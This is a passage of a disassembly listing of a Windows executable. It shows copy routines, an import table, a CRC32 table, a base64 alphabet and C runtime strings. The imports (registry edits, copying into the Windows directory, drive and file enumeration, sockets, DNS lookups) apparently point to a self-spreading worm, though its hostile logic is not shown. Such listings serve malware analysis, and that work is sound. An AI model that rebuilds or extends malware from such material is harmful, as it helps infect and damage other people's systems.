		dd offset UnwindDown4_0
		dd offset UnwindDown3_0
		dd offset UnwindDown2_0
		dd offset UnwindDown1_0
off_405A50	dd offset UnwindDown0_0	; DATA XREF: A:00405982r
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

UnwindDown7_0:				; DATA XREF: A:00405A34o
		mov	eax, [esi+ecx*4+1Ch]
		mov	[edi+ecx*4+1Ch], eax

UnwindDown6_0:				; DATA XREF: A:00405A38o
		mov	eax, [esi+ecx*4+18h]
		mov	[edi+ecx*4+18h], eax

UnwindDown5_0:				; DATA XREF: A:00405A3Co
		mov	eax, [esi+ecx*4+14h]
		mov	[edi+ecx*4+14h], eax

UnwindDown4_0:				; DATA XREF: A:00405A40o
		mov	eax, [esi+ecx*4+10h]
		mov	[edi+ecx*4+10h], eax

UnwindDown3_0:				; DATA XREF: A:00405A44o
		mov	eax, [esi+ecx*4+0Ch]
		mov	[edi+ecx*4+0Ch], eax

UnwindDown2_0:				; DATA XREF: A:00405A48o
		mov	eax, [esi+ecx*4+8]
		mov	[edi+ecx*4+8], eax

UnwindDown1_0:				; DATA XREF: A:00405A4Co
		mov	eax, [esi+ecx*4+4]
		mov	[edi+ecx*4+4], eax
		lea	eax, ds:0[ecx*4]
		add	esi, eax
		add	edi, eax
; [0000005E BYTES: COLLAPSED FUNCTION UnwindDown0_0. PRESS KEYPAD "+" TO EXPAND]
; [00000224 BYTES: COLLAPSED FUNCTION ___crtLCMapStringA. PRESS	KEYPAD "+" TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION _strncnt.	PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION RtlUnwind. PRESS KEYPAD "+" TO EXPAND]
		dd 2Dh dup(0)
		align 10h
		dd 80h dup(?)
A		ends

; Section 2. (virtual address 00006000)
; Virtual size			: 00002000 (   8192.)
; Section size in file		: 00001200 (   4608.)
; Offset to raw	data for section: 00005200
; Flags	E0000060: Text Data Executable Readable	Writable
; Alignment	: 16 bytes ?
;
; Imports from ADVAPI32
;
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Externs
; _idata
; LONG __stdcall RegDeleteKeyA(HKEY hKey,LPCSTR	lpSubKey)
		extrn RegDeleteKeyA:dword ; DATA XREF: sub_402DDF+119r
					; sub_402DDF+1B3r ...
; LONG __stdcall RegOpenKeyA(HKEY hKey,LPCSTR lpSubKey,PHKEY phkResult)
		extrn RegOpenKeyA:dword	; DATA XREF: sub_402DB1+Dr
					; sub_402DDF+A5r
; LONG __stdcall RegDeleteValueA(HKEY hKey,LPCSTR lpValueName)
		extrn RegDeleteValueA:dword ; DATA XREF: sub_402DB1+1Dr
; LONG __stdcall RegCloseKey(HKEY hKey)
		extrn RegCloseKey:dword	; DATA XREF: sub_402DB1+26r
					; sub_402DDF+D4r
; LONG __stdcall RegSetValueExA(HKEY hKey,LPCSTR lpValueName,DWORD Reserved,DWORD dwType,const BYTE *lpData,DWORD cbData)
		extrn RegSetValueExA:dword ; DATA XREF:	sub_402DDF+CBr

;
; Imports from KERNEL32
;
; BOOL __stdcall ReadFile(HANDLE hFile,LPVOID lpBuffer,DWORD nNumberOfBytesToRead,LPDWORD lpNumberOfBytesRead,LPOVERLAPPED lpOverlapped)
		extrn ReadFile:dword	; DATA XREF: sub_4017AD+16Br
					; sub_401A6D+1Ar ...
; DWORD	__stdcall SetFilePointer(HANDLE	hFile,LONG lDistanceToMove,PLONG lpDistanceToMoveHigh,DWORD dwMoveMethod)
		extrn SetFilePointer:dword ; DATA XREF:	sub_4017AD+14Er
					; sub_401A6D+14r ...
; BOOL __stdcall WriteFile(HANDLE hFile,LPCVOID	lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,LPOVERLAPPED lpOverlapped)
		extrn WriteFile:dword	; DATA XREF: sub_4017AD+117r
					; sub_4017AD+128r ...
; int __stdcall	lstrlenA(LPCSTR	lpString)
		extrn lstrlenA:dword	; DATA XREF: sub_4017AD+F5r
					; sub_4017AD+101r ...
; DWORD	__stdcall GetFileSize(HANDLE hFile,LPDWORD lpFileSizeHigh)
		extrn GetFileSize:dword	; DATA XREF: sub_4017AD+D1r
					; sub_4017AD+E4r ...
; HANDLE __stdcall CreateFileA(LPCSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,DWORD dwFlagsAndAttributes,HANDLE hTemplateFile)
		extrn CreateFileA:dword	; DATA XREF: sub_4017AD+14r
					; sub_4017AD+28r ...
; void __stdcall GetSystemTime(LPSYSTEMTIME lpSystemTime)
		extrn GetSystemTime:dword ; DATA XREF: sub_4019E8+Ar
; DWORD	__stdcall GetTimeZoneInformation(LPTIME_ZONE_INFORMATION lpTimeZoneInformation)
		extrn GetTimeZoneInformation:dword ; DATA XREF:	sub_401B67+A6r
; void __stdcall GetLocalTime(LPSYSTEMTIME lpSystemTime)
		extrn GetLocalTime:dword ; DATA	XREF: sub_401B67+92r
					; sub_402FC4+19r
; UINT __stdcall _lread(HFILE hFile,LPVOID lpBuffer,UINT uBytes)
		extrn _lread:dword	; DATA XREF: sub_401CB2+22r
					; sub_402A51+8Br ...
; HFILE	__stdcall _lclose(HFILE	hFile)
		extrn _lclose:dword	; DATA XREF: sub_401E62+836r
					; sub_402A51+1FCr
; HFILE	__stdcall _lopen(LPCSTR	lpPathName,int iReadWrite)
		extrn _lopen:dword	; DATA XREF: sub_401E62+80Dr
					; sub_402A51+67r
; DWORD	__stdcall GetModuleFileNameA(HMODULE hModule,LPSTR lpFilename,DWORD nSize)
		extrn GetModuleFileNameA:dword ; DATA XREF: sub_401E62+47Cr
					; sub_401E62+510r ...
; UINT __stdcall GetWindowsDirectoryA(LPSTR lpBuffer,UINT uSize)
		extrn GetWindowsDirectoryA:dword ; DATA	XREF: sub_401E62+3B8r
					; sub_402DDF+2Ar
; LPSTR	__stdcall lstrcpyA(LPSTR lpString1,LPCSTR lpString2)
		extrn lstrcpyA:dword	; DATA XREF: sub_401E62+45r
					; sub_401E62+7Ar
; LONG __stdcall _llseek(HFILE hFile,LONG lOffset,int iOrigin)
		extrn _llseek:dword	; DATA XREF: sub_402A51+1CDr
; BOOL __stdcall FindClose(HANDLE hFindFile)
		extrn FindClose:dword	; DATA XREF: sub_402C58+115r
; BOOL __stdcall FindNextFileA(HANDLE hFindFile,LPWIN32_FIND_DATAA lpFindFileData)
		extrn FindNextFileA:dword ; DATA XREF: sub_402C58+106r
; HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName,LPWIN32_FIND_DATAA lpFindFileData)
		extrn FindFirstFileA:dword ; DATA XREF:	sub_402C58+3Br
; UINT __stdcall GetDriveTypeA(LPCSTR lpRootPathName)
		extrn GetDriveTypeA:dword ; DATA XREF: StartAddress+17r
; BOOL __stdcall SetThreadPriority(HANDLE hThread,int nPriority)
		extrn SetThreadPriority:dword ;	DATA XREF: StartAddress+Ar
					; sub_402FC4+Fr
; HANDLE GetCurrentThread(void)
		extrn GetCurrentThread:dword ; DATA XREF: StartAddress+3r
					; sub_402FC4+8r
; BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName,LPCSTR lpNewFileName,BOOL bFailIfExists)
		extrn CopyFileA:dword	; DATA XREF: sub_402DDF+7Cr
; void __stdcall Sleep(DWORD dwMilliseconds)
		extrn Sleep:dword	; DATA XREF: sub_402FC4+6Cr
					; sub_403038+Cr ...
; BOOL __stdcall Beep(DWORD dwFreq,DWORD dwDuration)
		extrn Beep:dword	; DATA XREF: sub_402FC4+64r
; BOOL __stdcall CloseHandle(HANDLE hObject)
		extrn CloseHandle:dword	; DATA XREF: sub_4017AD+21Br
					; sub_4017AD+224r
; DWORD	GetLastError(void)
		extrn GetLastError:dword ; DATA	XREF: WinMain(x,x,x,x)+2Cr
					; _remove+Er
; HANDLE __stdcall CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes,BOOL bInitialOwner,LPCSTR lpName)
		extrn CreateMutexA:dword ; DATA	XREF: WinMain(x,x,x,x)+21r
; DWORD	GetTickCount(void)
		extrn GetTickCount:dword ; DATA	XREF: WinMain(x,x,x,x)+Ar
; int __stdcall	LCMapStringA(LCID Locale,DWORD dwMapFlags,LPCSTR lpSrcStr,int cchSrc,LPSTR lpDestStr,int cchDest)
		extrn LCMapStringA:dword ; DATA	XREF: ___crtLCMapStringA+5Er
					; ___crtLCMapStringA+A7r
; HMODULE __stdcall LoadLibraryA(LPCSTR	lpLibFileName)
		extrn LoadLibraryA:dword ; DATA	XREF: ___crtMessageBoxA+12r
; FARPROC __stdcall GetProcAddress(HMODULE hModule,LPCSTR lpProcName)
		extrn GetProcAddress:dword ; DATA XREF:	___crtMessageBoxA+1Er
					; ___crtMessageBoxA+2Ar ...
; UINT GetOEMCP(void)
		extrn GetOEMCP:dword	; DATA XREF: _getSystemCP+1Ar
; UINT GetACP(void)
		extrn GetACP:dword	; DATA XREF: _getSystemCP+2Fr
; BOOL __stdcall GetCPInfo(UINT	CodePage,LPCPINFO lpCPInfo)
		extrn GetCPInfo:dword	; DATA XREF: __setmbcp+48r
					; _setSBUpLow+14r
; BOOL __stdcall GetStringTypeW(DWORD dwInfoType,LPCWSTR lpSrcStr,int cchSrc,LPWORD lpCharType)
		extrn GetStringTypeW:dword ; DATA XREF:	___crtGetStringTypeA+3Fr
					; ___crtGetStringTypeA+12Dr
; BOOL __stdcall GetStringTypeA(LCID Locale,DWORD dwInfoType,LPCSTR lpSrcStr,int cchSrc,LPWORD lpCharType)
		extrn GetStringTypeA:dword ; DATA XREF:	___crtGetStringTypeA+59r
					; ___crtGetStringTypeA+8Dr
; int __stdcall	MultiByteToWideChar(UINT CodePage,DWORD	dwFlags,LPCSTR lpMultiByteStr,int cchMultiByte,LPWSTR lpWideCharStr,int	cchWideChar)
		extrn MultiByteToWideChar:dword	; DATA XREF: ___crtGetStringTypeA+C5r
					; ___crtGetStringTypeA+11Br ...
; LPVOID __stdcall HeapReAlloc(HANDLE hHeap,DWORD dwFlags,LPVOID lpMem,DWORD dwBytes)
		extrn HeapReAlloc:dword	; DATA XREF: ___sbh_alloc_new_region+28r
; LPVOID __stdcall VirtualAlloc(LPVOID lpAddress,DWORD dwSize,DWORD flAllocationType,DWORD flProtect)
		extrn VirtualAlloc:dword ; DATA	XREF: ___sbh_alloc_new_region+76r
					; ___sbh_alloc_new_group+51r
		extrn __imp_RtlUnwind:dword ; DATA XREF: RtlUnwindr
; BOOL __stdcall VirtualFree(LPVOID lpAddress,DWORD dwSize,DWORD dwFreeType)
		extrn VirtualFree:dword	; DATA XREF: ___sbh_free_block+23Fr
					; ___sbh_free_block+257r ...
; LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
		extrn UnhandledExceptionFilter:dword ; DATA XREF: __XcptFilter+138r
; HANDLE __stdcall HeapCreate(DWORD flOptions,DWORD dwInitialSize,DWORD	dwMaximumSize)
		extrn HeapCreate:dword	; DATA XREF: __heap_init+11r
; BOOL __stdcall HeapDestroy(HANDLE hHeap)
		extrn HeapDestroy:dword	; DATA XREF: __heap_init+2Fr
; DWORD	__stdcall GetFileType(HANDLE hFile)
		extrn GetFileType:dword	; DATA XREF: __ioinit+FFr
					; __ioinit+166r
; HANDLE __stdcall GetStdHandle(DWORD nStdHandle)
		extrn GetStdHandle:dword ; DATA	XREF: __ioinit+158r
					; __NMSG_WRITE+143r
; UINT __stdcall SetHandleCount(UINT uNumber)
		extrn SetHandleCount:dword ; DATA XREF:	__ioinit+19Dr
; LPWSTR GetEnvironmentStringsW(void)
		extrn GetEnvironmentStringsW:dword
					; DATA XREF: ___crtGetEnvironmentStringsA+9r
					; ___crtGetEnvironmentStringsA+1Br ...
; LPSTR	GetEnvironmentStrings(void)
		extrn GetEnvironmentStrings:dword
					; DATA XREF: ___crtGetEnvironmentStringsA:loc_404315r
					; ___crtGetEnvironmentStringsA+E1r
; HGLOBAL __stdcall GlobalAlloc(UINT uFlags,DWORD dwBytes)
		extrn GlobalAlloc:dword	; DATA XREF: sub_40156C+2Ar
					; sub_40156C+33r ...
; HGLOBAL __stdcall GlobalFree(HGLOBAL hMem)
		extrn GlobalFree:dword	; DATA XREF: sub_40156C+4Ar
					; sub_40156C+FAr ...
; BOOL __stdcall FreeEnvironmentStringsA(LPSTR)
		extrn FreeEnvironmentStringsA:dword
					; DATA XREF: ___crtGetEnvironmentStringsA+11Fr
; BOOL __stdcall FreeEnvironmentStringsW(LPWSTR)
		extrn FreeEnvironmentStringsW:dword
					; DATA XREF: ___crtGetEnvironmentStringsA+CEr
; HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,DWORD dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID	lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId)
		extrn CreateThread:dword ; DATA	XREF: WinMain(x,x,x,x)+95r
					; WinMain(x,x,x,x)+AEr	...
; int __stdcall	LCMapStringW(LCID Locale,DWORD dwMapFlags,LPCWSTR lpSrcStr,int cchSrc,LPWSTR lpDestStr,int cchDest)
		extrn LCMapStringW:dword ; DATA	XREF: ___crtLCMapStringA+42r
					; ___crtLCMapStringA+14Dr ...
; BOOL __stdcall DeleteFileA(LPCSTR lpFileName)
		extrn DeleteFileA:dword	; DATA XREF: _remove+4r
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
		extrn GetModuleHandleA:dword ; DATA XREF: start+C2r
; void __stdcall GetStartupInfoA(LPSTARTUPINFOA	lpStartupInfo)
		extrn GetStartupInfoA:dword ; DATA XREF: start+9Fr
					; __ioinit+59r
; LPSTR	GetCommandLineA(void)
		extrn GetCommandLineA:dword ; DATA XREF: start+74r
; DWORD	GetVersion(void)
		extrn GetVersion:dword	; DATA XREF: start+26r
					; Get current version number of	Windows
					; and information about	the operating system platform
; void __stdcall ExitProcess(UINT uExitCode)
		extrn ExitProcess:dword	; DATA XREF: _fast_error_exit+1Dr
					; _doexit+91r
; LPVOID __stdcall HeapAlloc(HANDLE hHeap,DWORD	dwFlags,DWORD dwBytes)
		extrn HeapAlloc:dword	; DATA XREF: __heap_alloc+2Er
					; ___sbh_heap_init+Dr ...
; BOOL __stdcall HeapFree(HANDLE hHeap,DWORD dwFlags,LPVOID lpMem)
		extrn HeapFree:dword	; DATA XREF: _free+27r
					; ___sbh_free_block+2C4r ...
; BOOL __stdcall TerminateProcess(HANDLE hProcess,UINT uExitCode)
		extrn TerminateProcess:dword ; DATA XREF: _doexit+17r
; HANDLE GetCurrentProcess(void)
		extrn GetCurrentProcess:dword ;	DATA XREF: _doexit+10r
; int __stdcall	WideCharToMultiByte(UINT CodePage,DWORD	dwFlags,LPCWSTR	lpWideCharStr,int cchWideChar,LPSTR lpMultiByteStr,int cchMultiByte,LPCSTR lpDefaultChar,LPBOOL	lpUsedDefaultChar)
		extrn WideCharToMultiByte:dword
					; DATA XREF: ___crtGetEnvironmentStringsA+7Er
					; ___crtGetEnvironmentStringsA+93r ...

;
; Imports from USER32
;
; DWORD	__stdcall CharLowerBuffA(LPSTR lpsz,DWORD cchLength)
		extrn CharLowerBuffA:dword ; DATA XREF:	sub_402A51+31r
					; sub_402A51+CAr ...
; int wsprintfA(LPSTR,LPCSTR,...)
		extrn wsprintfA:dword	; DATA XREF: sub_401B67+13Er
					; sub_401E62+63Fr

;
; Imports from WININET
;
		extrn InternetGetConnectedState:dword ;	DATA XREF: sub_403038+4r
					; sub_403038+22r ...

;
; Imports from WS2_32
;
; int __stdcall	WSAStartup(WORD	wVersionRequested,LPWSADATA lpWSAData)
		extrn WSAStartup:dword	; DATA XREF: WinMain(x,x,x,x)+4Er
; int __stdcall	connect(SOCKET s,const struct sockaddr *name,int namelen)
		extrn connect:dword	; DATA XREF: sub_401E62+11Ar
; int __stdcall	shutdown(SOCKET	s,int how)
		extrn shutdown:dword	; DATA XREF: sub_401E62+90Dr
; int __stdcall	recv(SOCKET s,char *buf,int len,int flags)
		extrn recv:dword	; DATA XREF: sub_401D9B+5Ar
; u_short __stdcall ntohs(u_short netshort)
		extrn ntohs:dword	; DATA XREF: sub_401335+23r
					; sub_401335+35r ...
; char *__stdcall inet_ntoa(struct in_addr in)
		extrn inet_ntoa:dword	; DATA XREF: sub_401335+1E2r
; u_short __stdcall htons(u_short hostshort)
		extrn htons:dword	; DATA XREF: sub_4010A4+37r
					; sub_4010A4:loc_401111r ...
; struct servent *__stdcall getservbyname(const	char *name,const char *proto)
		extrn getservbyname:dword ; DATA XREF: sub_4010A4+5Br
; int __stdcall	send(SOCKET s,const char *buf,int len,int flags)
		extrn send:dword	; DATA XREF: sub_401CB2+Br
					; sub_401CB2+64r ...
; struct hostent *__stdcall gethostbyname(const	char *name)
		extrn gethostbyname:dword ; DATA XREF: sub_4010A4+87r
					; sub_401E62+8Er
; SOCKET __stdcall socket(int af,int type,int protocol)
		extrn socket:dword	; DATA XREF: sub_4010A4+A0r
					; sub_401E62+D6r
; int __stdcall	setsockopt(SOCKET s,int	level,int optname,const	char *optval,int optlen)
		extrn setsockopt:dword	; DATA XREF: sub_4010A4+128r
					; sub_4010A4+149r ...
; int __stdcall	sendto(SOCKET s,const char *buf,int len,int flags,const	struct sockaddr	*to,int	tolen)
		extrn sendto:dword	; DATA XREF: sub_4010A4+171r
; int __stdcall	recvfrom(SOCKET	s,char *buf,int	len,int	flags,struct sockaddr *from,int	*fromlen)
		extrn recvfrom:dword	; DATA XREF: sub_4010A4+194r
; int WSAGetLastError(void)
		extrn WSAGetLastError:dword ; DATA XREF: sub_4010A4+19Fr
; int __stdcall	closesocket(SOCKET s)
		extrn closesocket:dword	; DATA XREF: sub_4010A4+1B7r
					; sub_401E62+919r
; unsigned __int32 __stdcall inet_addr(const char *cp)
		extrn inet_addr:dword	; DATA XREF: sub_4010A4+76r

;
; Imports from iphlpapi
;
		extrn __imp_GetNetworkParams:dword ; DATA XREF:	GetNetworkParamsr


; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure code
; Segment permissions: Read/Write/Execute
B		segment	para public 'CODE' use32
		assume cs:B
		;org 40618Ch
		assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
		align 10h
dword_406190	dd 0			; DATA XREF: sub_401691+44r
					; sub_401691+5Br ...
		dd 77073096h, 0EE0E612Ch, 990951BAh, 76DC419h, 706AF48Fh
		dd 0E963A535h, 9E6495A3h, 0EDB8832h, 79DCB8A4h,	0E0D5E91Eh
		dd 97D2D988h, 9B64C2Bh,	7EB17CBDh, 0E7B82D07h, 90BF1D91h
		dd 1DB71064h, 6AB020F2h, 0F3B97148h, 84BE41DEh,	1ADAD47Dh
		dd 6DDDE4EBh, 0F4D4B551h, 83D385C7h, 136C9856h,	646BA8C0h
		dd 0FD62F97Ah, 8A65C9ECh, 14015C4Fh, 63066CD9h,	0FA0F3D63h
		dd 8D080DF5h, 3B6E20C8h, 4C69105Eh, 0D56041E4h,	0A2677172h
		dd 3C03E4D1h, 4B04D447h, 0D20D85FDh, 0A50AB56Bh, 35B5A8FAh
		dd 42B2986Ch, 0DBBBC9D6h, 0ACBCF940h, 32D86CE3h, 45DF5C75h
		dd 0DCD60DCFh, 0ABD13D59h, 26D930ACh, 51DE003Ah, 0C8D75180h
		dd 0BFD06116h, 21B4F4B5h, 56B3C423h, 0CFBA9599h, 0B8BDA50Fh
		dd 2802B89Eh, 5F058808h, 0C60CD9B2h, 0B10BE924h, 2F6F7C87h
		dd 58684C11h, 0C1611DABh, 0B6662D3Dh, 76DC4190h, 1DB7106h
		dd 98D220BCh, 0EFD5102Ah, 71B18589h, 6B6B51Fh, 9FBFE4A5h
		dd 0E8B8D433h, 7807C9A2h, 0F00F934h, 9609A88Eh,	0E10E9818h
		dd 7F6A0DBBh, 86D3D2Dh,	91646C97h, 0E6635C01h, 6B6B51F4h
		dd 1C6C6162h, 856530D8h, 0F262004Eh, 6C0695EDh,	1B01A57Bh
		dd 8208F4C1h, 0F50FC457h, 65B0D9C6h, 12B7E950h,	8BBEB8EAh
		dd 0FCB9887Ch, 62DD1DDFh, 15DA2D49h, 8CD37CF3h,	0FBD44C65h
		dd 4DB26158h, 3AB551CEh, 0A3BC0074h, 0D4BB30E2h, 4ADFA541h
		dd 3DD895D7h, 0A4D1C46Dh, 0D3D6F4FBh, 4369E96Ah, 346ED9FCh
		dd 0AD678846h, 0DA60B8D0h, 44042D73h, 33031DE5h, 0AA0A4C5Fh
		dd 0DD0D7CC9h, 5005713Ch, 270241AAh, 0BE0B1010h, 0C90C2086h
		dd 5768B525h, 206F85B3h, 0B966D409h, 0CE61E49Fh, 5EDEF90Eh
		dd 29D9C998h, 0B0D09822h, 0C7D7A8B4h, 59B33D17h, 2EB40D81h
		dd 0B7BD5C3Bh, 0C0BA6CADh, 0EDB88320h, 9ABFB3B6h, 3B6E20Ch
		dd 74B1D29Ah, 0EAD54739h, 9DD277AFh, 4DB2615h, 73DC1683h
		dd 0E3630B12h, 94643B84h, 0D6D6A3Eh, 7A6A5AA8h,	0E40ECF0Bh
		dd 9309FF9Dh, 0A00AE27h, 7D079EB1h, 0F00F9344h,	8708A3D2h
		dd 1E01F268h, 6906C2FEh, 0F762575Dh, 806567CBh,	196C3671h
		dd 6E6B06E7h, 0FED41B76h, 89D32BE0h, 10DA7A5Ah,	67DD4ACCh
		dd 0F9B9DF6Fh, 8EBEEFF9h, 17B7BE43h, 60B08ED5h,	0D6D6A3E8h
		dd 0A1D1937Eh, 38D8C2C4h, 4FDFF252h, 0D1BB67F1h, 0A6BC5767h
		dd 3FB506DDh, 48B2364Bh, 0D80D2BDAh, 0AF0A1B4Ch, 36034AF6h
		dd 41047A60h, 0DF60EFC3h, 0A867DF55h, 316E8EEFh, 4669BE79h
		dd 0CB61B38Ch, 0BC66831Ah, 256FD2A0h, 5268E236h, 0CC0C7795h
		dd 0BB0B4703h, 220216B9h, 5505262Fh, 0C5BA3BBEh, 0B2BD0B28h
		dd 2BB45A92h, 5CB36A04h, 0C2D7FFA7h, 0B5D0CF31h, 2CD99E8Bh
		dd 5BDEAE1Dh, 9B64C2B0h, 0EC63F226h, 756AA39Ch,	26D930Ah
		dd 9C0906A9h, 0EB0E363Fh, 72076785h, 5005713h, 95BF4A82h
		dd 0E2B87A14h, 7BB12BAEh, 0CB61B38h, 92D28E9Bh,	0E5D5BE0Dh
		dd 7CDCEFB7h, 0BDBDF21h, 86D3D2D4h, 0F1D4E242h,	68DDB3F8h
		dd 1FDA836Eh, 81BE16CDh, 0F6B9265Bh, 6FB077E1h,	18B74777h
		dd 88085AE6h, 0FF0F6A70h, 66063BCAh, 11010B5Ch,	8F659EFFh
		dd 0F862AE69h, 616BFFD3h, 166CCF45h, 0A00AE278h, 0D70DD2EEh
		dd 4E048354h, 3903B3C2h, 0A7672661h, 0D06016F7h, 4969474Dh
		dd 3E6E77DBh, 0AED16A4Ah, 0D9D65ADCh, 40DF0B66h, 37D83BF0h
		dd 0A9BCAE53h, 0DEBB9EC5h, 47B2CF7Fh, 30B5FFE9h, 0BDBDF21Ch
		dd 0CABAC28Ah, 53B39330h, 24B4A3A6h, 0BAD03605h, 0CDD70693h
		dd 54DE5729h, 23D967BFh, 0B3667A2Eh, 0C4614AB8h, 5D681B02h
		dd 2A6F2B94h, 0B40BBE37h, 0C30C8EA1h, 5A05DF1Bh, 2D02EF8Dh
byte_406590	db 0			; DATA XREF: sub_4028A4+35r
		db 1, 2	dup(0)
byte_406594	db 41h			; DATA XREF: sub_401AF4+Br
					; sub_401AF4+2Dr ...
aBcdefghijklmno	db 'BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678'
		db '9+/',0
		align 4
dword_4065D8	dd 0FFFFFFFFh, 403B1Bh,	403B2Fh, 746E7572h, 20656D69h ;	DATA XREF: start+5o
		dd 6F727265h, 2072h, 534F4C54h,	72652053h, 0D726F72h, 0Ah
		dd 474E4953h, 72726520h, 0A0D726Fh, 0, 414D4F44h, 65204E49h
		dd 726F7272h, 0A0Dh, 32303652h,	2D0A0D38h, 616E7520h, 20656C62h
		dd 69206F74h, 6974696Eh, 7A696C61h, 65682065h, 0A0D7061h
		dd 0, 32303652h, 2D0A0D37h, 746F6E20h, 6F6E6520h, 20686775h
		dd 63617073h, 6F662065h, 6F6C2072h, 206F6977h, 74696E69h
		dd 696C6169h, 6974617Ah, 0A0D6E6Fh, 0, 32303652h, 2D0A0D36h
		dd 746F6E20h, 6F6E6520h, 20686775h, 63617073h, 6F662065h
		dd 74732072h, 206F6964h, 74696E69h, 696C6169h, 6974617Ah
		dd 0A0D6E6Fh, 0, 32303652h, 2D0A0D35h, 72757020h, 69762065h
		dd 61757472h, 7566206Ch, 6974636Eh, 63206E6Fh, 0D6C6C61h
		dd 0Ah,	32303652h, 2D0A0D34h, 746F6E20h, 6F6E6520h, 20686775h
		dd 63617073h, 6F662065h, 6F5F2072h, 6978656Eh, 74612F74h
		dd 74697865h, 62617420h, 0A0D656Ch, 0, 31303652h, 2D0A0D39h
		dd 616E7520h, 20656C62h, 6F206F74h, 206E6570h, 736E6F63h
		dd 20656C6Fh, 69766564h, 0A0D6563h, 0, 31303652h, 2D0A0D38h
		dd 656E7520h, 63657078h, 20646574h, 70616568h, 72726520h
		dd 0A0D726Fh, 0, 31303652h, 2D0A0D37h, 656E7520h, 63657078h
		dd 20646574h, 746C756Dh, 72687469h, 20646165h, 6B636F6Ch
		dd 72726520h, 0A0D726Fh, 0, 31303652h, 2D0A0D36h, 746F6E20h
		dd 6F6E6520h, 20686775h, 63617073h, 6F662065h, 68742072h
		dd 64616572h, 74616420h, 0A0D61h, 62610A0Dh, 6D726F6Eh
		dd 70206C61h, 72676F72h, 74206D61h, 696D7265h, 6974616Eh
		dd 0A0D6E6Fh, 0, 30303652h, 2D0A0D39h, 746F6E20h, 6F6E6520h
		dd 20686775h, 63617073h, 6F662065h, 6E652072h, 6F726976h
		dd 6E656D6Eh, 0A0D74h, 30303652h, 2D0A0D38h, 746F6E20h
		dd 6F6E6520h, 20686775h, 63617073h, 6F662065h, 72612072h
		dd 656D7567h, 0D73746Eh, 0Ah, 30303652h, 2D0A0D32h, 6F6C6620h
		dd 6E697461h, 6F702067h, 20746E69h, 20746F6Eh, 64616F6Ch
		dd 0A0D6465h, 0
aMicrosoftVisua	db 'Microsoft Visual C++ Runtime Library',0 ; DATA XREF: __NMSG_WRITE+119o
		align 4
; char asc_406894[]
asc_406894	db 0Ah			; DATA XREF: __NMSG_WRITE+F1o
		db 0Ah,0
		align 4
; char aRuntimeErrorPr[]
aRuntimeErrorPr	db 'Runtime Error!',0Ah ; DATA XREF: __NMSG_WRITE+D3o
		db 0Ah
		db 'Program: ',0
		align 4
; char a___[]
a___		db '...',0              ; DATA XREF: __NMSG_WRITE+BFo
; char aProgramNameUnk[]
aProgramNameUnk	db '<program name unknown>',0 ; DATA XREF: __NMSG_WRITE+7Do
		align 10h
; const	WCHAR SrcStr
SrcStr		dw 0			; DATA XREF: ___crtGetStringTypeA+39o
					; ___crtLCMapStringA+36o
		align 8
dword_4068D8	dd 0FFFFFFFFh, 4052B9h,	4052BDh	; DATA XREF: ___crtGetStringTypeA+5o
; char aGetlastactivep[]
aGetlastactivep	db 'GetLastActivePopup',0 ; DATA XREF: ___crtMessageBoxA+3Do
		align 4
; char aGetactivewindo[]
aGetactivewindo	db 'GetActiveWindow',0  ; DATA XREF: ___crtMessageBoxA+35o
; char ProcName[]
ProcName	db 'MessageBoxA',0      ; DATA XREF: ___crtMessageBoxA+24o
; char LibFileName[]
LibFileName	db 'user32.dll',0       ; DATA XREF: ___crtMessageBoxA+Do
		align 10h
dword_406920	dd 0FFFFFFFFh, 405C05h,	405C09h, 0FFFFFFFFh, 405CB9h, 405CBDh
					; DATA XREF: ___crtLCMapStringA+5o
		dd 3 dup(0), 69CCh, 6128h, 3 dup(0), 69D7h, 6018h, 3 dup(0)
		dd 69E4h, 6134h, 3 dup(0), 69F0h, 613Ch, 3 dup(0), 69FBh
		dd 6184h, 3 dup(0), 6A08h, 6000h, 7 dup(0), 52455355h
		dd 642E3233h, 4B006C6Ch, 454E5245h, 2E32334Ch, 6C6C64h
		dd 494E4957h, 2E54454Eh, 6C6C64h, 5F325357h, 642E3233h
		dd 69006C6Ch, 706C6870h, 2E697061h, 6C6C64h, 41564441h
		dd 32334950h, 6C6C642Eh, 4Fh dup(0), 73770000h,	6E697270h
		dd 416674h, 68430000h, 6F4C7261h, 42726577h, 41666675h
		dd 4 dup(0), 626F6C47h,	72466C61h, 6565h, 6C470000h, 6C61626Fh
		dd 6F6C6C41h, 63h, 736F6C43h, 6E614865h, 656C64h, 65520000h
		dd 69466461h, 656Ch, 65530000h,	6C694674h, 696F5065h, 7265746Eh
		dd 0, 74697257h, 6C694665h, 65h, 7274736Ch, 416E656Ch
